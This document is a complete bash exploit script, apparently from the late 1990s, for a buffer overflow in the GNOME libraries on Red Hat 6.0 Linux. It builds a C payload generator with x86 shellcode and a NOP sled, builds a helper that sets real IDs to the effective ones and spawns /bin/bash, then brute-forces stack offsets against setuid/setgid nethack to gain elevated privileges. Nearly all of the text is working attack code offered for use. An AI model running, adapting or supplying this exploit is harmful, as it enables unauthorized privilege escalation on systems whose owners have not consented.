#!/bin/bash
# Generic exploit for GNOME apps under Linux x86
# Our overflowed buffer is just 80 bytes so we'll have to get our settings
# just so.  Hence the shell script.
#
# This should work against any su/gid GNOME program.  The only one that comes
# with RH6.0 that is su/gid root is (the irony is killing me) nethack.
#
# Change the /usr/games/nethack statement in the while loop below to exploit
# a different program.
#
# -Brock Tellier btellier@webley.com

echo "Building /tmp/gnox.c..."
cat > /tmp/gnox.c <<EOF
/*
 * Generic GNOME overflow exploit for Linux x86, tested on RH6.0
 * Will work against any program using the GNOME libraries in the form
 * Keep your BUFSIZ at 90 and only modify your offset
 *
 */


#include <stdlib.h>
#include <stdio.h>

char gnoshell[]= /* Generic Linux x86 shellcode modified to run our
program */
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/tmp/gn";

#define LEN 120
#define BUFLEN 90 /* no need to change this */
#define NOP 0x90
#define DEFAULT_OFFSET 300

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}

void main(int argc, char *argv[]) {

int offset, i;
int buflen = BUFLEN;
long int addr;
char buf[BUFLEN];
char gnobuf[LEN];
if(argc > 2) {
  fprintf(stderr, "Error: Usage: %s <offset>\n", argv[0]);
  exit(0);
}
 else if (argc == 2){
   offset=atoi(argv[1]);
 }
 else {
   offset=DEFAULT_OFFSET;
 }


addr=get_sp();

fprintf(stderr, "Generic GNOME exploit for Linux x86\n");
fprintf(stderr, "Brock Tellier btellier@webley.com\n\n");
fprintf(stderr, "Using addr: 0x%x  buflen:%d  offset:%d\n", addr-offset,
buflen, offset);

memset(buf,NOP,buflen);
memcpy(buf+35,gnoshell,strlen(gnoshell));
for(i=35+strlen(gnoshell);i<buflen-4;i+=4)
        *(int *)&buf[i]=addr-offset;

sprintf(gnobuf, "--enable-sound --espeaker=%s", buf);
for(i=0;i<strlen(gnobuf);i++)
        putchar(gnobuf[i]);

}
EOF

echo "...done!"

echo "Building /tmp/gn.c..."

cat > /tmp/gn.c <<EOF
#include <unistd.h>

void main() {
  printf("before: uid=%d, euid=%d, gid=%d, egid=%d\n", getuid(),
geteuid(), getgid(), getegid());

  setreuid(geteuid(), geteuid());
  setregid(getegid(), getegid());

  printf("after: uid=%d, euid=%d, gid=%d, egid=%d\n", getuid(),
geteuid(), getgid(), getegid());

  system("/bin/bash");
}
EOF

echo "...done!"

echo "Compiling /tmp/gnox..."
gcc -o /tmp/gnox /tmp/gnox.c
echo "...done!"

echo "Compiling /tmp/gn..."
gcc -o /tmp/gn /tmp/gn.c
echo "...done!"

echo "Launching attack..."

offset=0

while [ $offset -lt 10000 ]; do
    /usr/games/nethack `/tmp/gnox $offset`
    offset=`expr $offset + 4`
done

echo "...done!"
